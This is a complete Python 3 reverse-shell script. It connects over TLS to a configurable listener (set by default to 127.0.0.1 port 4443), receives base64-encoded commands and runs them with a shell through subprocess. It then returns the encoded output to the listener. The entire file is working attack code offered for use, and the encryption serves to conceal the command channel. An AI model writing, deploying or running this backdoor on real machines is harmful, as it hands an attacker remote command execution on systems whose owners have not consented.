"""
a reverse shell written in Python3.
specify the host and port to connect back to
data is encrypted with TLS


set SERVER to where you want to connect back to
set PORT to the TCP port your listener is listening on
"""

import base64
import socket
import subprocess
import ssl


SERVER = '127.0.0.1'
PORT = 4443


def reverse_shell(server, port):
    """
    basic reverse shell over TLS

    Args:
        server(str): the ip address or hostname of the listener to connect
                     back to
        port(int): the TCP port of the listener
    """
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc = ssl.wrap_socket(
        soc, ssl_version=ssl.PROTOCOL_TLSv1_2, ciphers='AES256')
    soc.connect((server, port))
    while True:
        data = soc.recv(1024)
        decoded = base64.b64decode(data)
        shell = subprocess.Popen(
            decoded, shell=True, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        cmdoutput = shell.stdout.read() + shell.stderr.read()
        encoded = base64.b64encode(cmdoutput)
        soc.send(encoded)
    soc.close()


if __name__ == '__main__':
    reverse_shell(SERVER, PORT)
